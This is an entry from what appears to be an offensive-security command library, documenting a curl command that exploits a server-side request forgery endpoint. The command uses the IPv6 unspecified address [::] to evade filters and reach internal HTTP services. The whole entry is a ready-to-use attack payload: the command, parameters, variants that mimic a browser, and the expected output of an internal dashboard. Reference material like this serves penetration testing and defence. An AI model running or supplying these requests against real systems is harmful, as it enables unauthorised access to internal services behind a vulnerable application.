---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[::]:80/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
verified: true
validated: true
---

# access-internal-http-via-ssrf-ipv6-unspecified

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[::]:80/"
```

## Description

This command sends a curl request to a vulnerable SSRF endpoint, using an IPv6 unspecified address ([::]) to bypass filters and access an internal HTTP service on port 80.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | The URL of the vulnerable application (e.g., target.com) | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[::]:80/"
```

### With Headers (to mimic browser)

```bash
curl -H "User-Agent: Mozilla/5.0" "http://target.com/ssrf?url=http://[::]:80/"
```

## Expected Output

Successful execution returns the content from the internal HTTP server, such as an HTML page or API response indicating access to localhost:80. Example:

```
<html><body>Internal Dashboard</body></html>
```

If filtered, expect a 403 or application error.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
- [[commands/access-internal-http-via-ssrf-ipv6-loopback]]
